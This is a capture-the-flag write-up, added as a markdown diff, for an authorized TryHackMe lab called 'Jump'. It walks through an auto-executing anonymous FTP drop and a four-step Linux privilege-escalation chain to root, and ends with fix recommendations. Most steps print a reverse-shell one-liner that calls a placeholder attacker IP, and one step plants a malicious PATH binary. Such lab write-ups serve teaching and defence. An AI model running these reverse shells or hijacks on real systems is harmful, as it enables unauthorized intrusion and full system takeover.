@@ -1,0 +1,223 @@
+---
+title: 'Jump'
+description: 'An anonymous, writable FTP drop that auto-executes uploads gives a first shell, then a four-user privilege-escalation chain climbs through a writable backup script, a systemd service with a writable PATH directory, a writable sudo-run helper, and finally sudo less to root.'
+date: 2026-05-31
+platform: tryhackme
+room: 'Jump'
+roomUrl: 'https://tryhackme.com/room/jump'
+difficulty: easy
+tags:
+  - 'ftp'
+  - 'linux'
+  - 'privesc'
+  - 'path-injection'
+  - 'sudo'
+vulnClasses:
+  - 'anonymous ftp write access'
+  - 'executable path hijacking'
+  - 'insecure privileged service'
+  - 'insecure sudo configuration'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Jump — An Auto-Executing FTP Drop and a Four-Hop Privilege-Escalation Chain**
+
+_A walkthrough of the "Jump" challenge from TryHackMe. An anonymous FTP server has a writable "incoming" directory whose uploads are run automatically — so our first shell is free. From there the box is a textbook Linux privilege-escalation ladder: a writable backup script, a systemd service that searches a writable PATH, a sudo-runnable helper we can edit, and finally_ _`sudo less`_ _to root. Five users, five weak permissions._
+
+> All flags are redacted. Jump is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Flags are shown as `THM{<redacted>}`; the real values were recovered on the box but are withheld here.
+
+---
+
+### **TL;DR — the whole chain**
+
+<Callout type="tldr">
+
+Anonymous FTP has a world-writable `incoming/` whose uploads are **auto-executed** → drop a reverse-shell script to get a shell as `recon_user` → `/opt/dev/backup.sh` is run by `dev_user` and is **writable by us**, append a callback → shell as `dev_user` → a systemd service (`healthcheck.service`, running as `monitor_user`) uses `Environment=PATH=/opt/dev/bin:...` and calls `ps` with no absolute path, and `/opt/dev/bin` is **writable by** **`dev_user`** → plant a malicious `ps`, wait for the timer → shell as `monitor_user` → `sudo -l` shows `monitor_user` may run `/usr/local/bin/deploy.sh` as `ops_user`, and that script calls a **writable** `/opt/app/deploy_helper.sh` → shell as `ops_user` → `ops_user` may run `/usr/bin/less` as **root** with NOPASSWD → `!bash` from the pager → **root**.
+
+Five users, each unlocked by a file or rule the previous user should never have been able to touch.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-vpn-ip>
+```
+
+A full-port scan shows just FTP and SSH — and the FTP banner already gives away the foothold:
+
+```text
+21/tcp open  ftp  vsftpd 3.0.5
+|  ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|  drwxrwxrwx  incoming [NSE: writeable]
+22/tcp open  ssh  OpenSSH 9.6p1 Ubuntu
+```
+
+Anonymous login is allowed and `incoming/` is world-writable. `pub/README.txt` explains why that matters:
+
+```text
+[ recon pipeline ]
+All recon jobs must be placed in incoming/.
+Files are processed automatically on arrival.
+Invalid formats are ignored.
+```
+
+<Callout type="insight">
+
+"Files are processed automatically" plus a world-writable upload directory is the whole foothold: anything we drop in `incoming/` is executed by the box. The rest of Jump then repeats one theme at every rung — **a higher-privileged process trusts a file or directory a lower user can write.**
+
+</Callout>
+
+### **Step 1 — FTP drop to a shell as** **`recon_user`**
+
+Write a tiny reverse-shell script and upload it to `incoming/`:
+
+```text
+cat shell.sh
+#!/bin/bash
+bash -i >& /dev/tcp/$ATTACKER_IP/4444 0>&1
+
+ftp -A $IP      # anonymous
+ftp> cd incoming
+ftp> put shell.sh
+```
+
+The pipeline runs it and our listener catches the shell:
+
+```text
+nc -lvnp 4444
+# connect from $IP ...
+recon_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Step 2 — writable backup script, shell as** **`dev_user`**
+
+Looking for writable directories, `/opt/dev` stands out, and `/opt/dev/backup.sh` is a script `dev_user` runs. We simply append our own callback:
+
+```text
+find / -type d -writable 2>/dev/null        # -> /opt/dev among others
+echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4445 0>&1' >> /opt/dev/backup.sh
+```
+
+When the script next runs, we land as `dev_user`:
+
+```text
+dev_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Step 3 — systemd PATH hijack, shell as** **`monitor_user`**
+
+`dev_user` can read the service that drives the box's "health check":
+
+```text
+cat /etc/systemd/system/healthcheck.service
+# [Service]
+# User=monitor_user
+# Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
+# ExecStart=/usr/local/bin/healthcheck
+
+cat /usr/local/bin/healthcheck
+# #!/bin/bash
+# ... ps aux | grep -v grep ...      # calls ps / grep with NO absolute path
+```
+
+The service runs as `monitor_user`, searches `/opt/dev/bin` **first** for commands, and `/opt/dev/bin` is writable by `dev_user`. A paired `healthcheck.timer` fires it every 60s. We plant a malicious `ps`:
+
+```text
+cd /opt/dev/bin
+rm ps
+printf '#!/bin/bash\nbash -i >& /dev/tcp/$ATTACKER_IP/4446 0>&1\n' > ps
+chmod +x ps
+```
+
+When the timer next triggers the service, `monitor_user` runs our `ps`:
+
+```text
+monitor_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Step 4 — writable sudo-run helper, shell as** **`ops_user`**
+
+`monitor_user` has a sudo rule:
+
+```text
+sudo -l
+# (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
+
+cat /usr/local/bin/deploy.sh
+# #!/bin/bash
+# cd /opt/app 2>/dev/null
+# ./deploy_helper.sh          # <- calls a helper we can write
+```
+
+`/opt/app/deploy_helper.sh` is writable by `monitor_user`, so we add a callback and run the allowed command as `ops_user`:
+
+```text
+echo 'bash -i >& /dev/tcp/$ATTACKER_IP/4448 0>&1' >> /opt/app/deploy_helper.sh
+sudo -u ops_user /usr/local/bin/deploy.sh
+```
+
+```text
+ops_user@tryhackme-2404:~$ cat flag.txt
+THM{<redacted>}
+```
+
+### **Step 5 —** **`sudo less`** **to root**
+
+`ops_user` closes it out with a classic GTFOBins sudo misconfiguration:
+
+```text
+sudo -l
+# (root) NOPASSWD: /usr/bin/less
+
+sudo /usr/bin/less /etc/passwd
+# then, inside the pager, type:
+!bash
+```
+
+`less` can spawn a shell with `!`, and because it runs as root, so does the shell:
+
+```text
+root@tryhackme-2404:~# cat /root/root.txt
+THM{<redacted>}
+```
+
+FTP drop → `recon_user` → `dev_user` → `monitor_user` → `ops_user` → root.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). Unauthenticated remote code execution (the FTP drop) chains into full root via four independent privilege-escalation flaws:
+
+- **Anonymous, writable FTP that auto-executes uploads** — instant foothold, no credentials.
+- **A writable script run by another user** (`backup.sh`) and **a sudo-run helper a lower user can edit** (`deploy_helper.sh`) — arbitrary code as that user.
+- **A systemd service with a writable PATH entry** and relative command names — code execution as the service account.
+- **`sudo less`** **as root** — a pager that can shell out, i.e. direct root.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Don't auto-execute untrusted uploads.** Disable anonymous FTP write, or process uploads in a sandbox that never runs them; `incoming/` should not be world-writable.
+2. **Lock down privileged scripts and their directories.** `backup.sh`, `deploy_helper.sh`, and `/opt/dev/bin` must be owned by root and not writable by lower-privileged users.
+3. **Harden the systemd unit.** Use absolute paths for every command, set a minimal trusted `PATH`, and never include a user-writable directory in it.
+4. **Fix the sudo rules.** Don't grant `NOPASSWD` on interpreters/pagers like `less` (GTFOBins), and don't let a user run a script whose callee they can modify.
+
+</Callout>
+
+### **Takeaways**
+
+- **"Processed automatically" means "executed."** A writable drop folder that runs its contents is remote code execution with no login.
+- **The recurring bug is write-where-you-shouldn't.** Every hop here was a higher user trusting a file or directory a lower user could edit — audit ownership and permissions on anything privileged code touches.
+- **Relative command names + a writable PATH = hijack.** Systemd units must call binaries by absolute path and keep user-writable dirs out of `PATH`.
+- **Check** **`sudo -l`** **first, every time.** `less` (and most pagers/editors) can spawn a shell; a single NOPASSWD entry was the whole last step.
+
+Thanks for reading. Jump is a clean tour of everyday Linux privesc — no exploits, just permissions and trust placed one notch too loosely at every level.
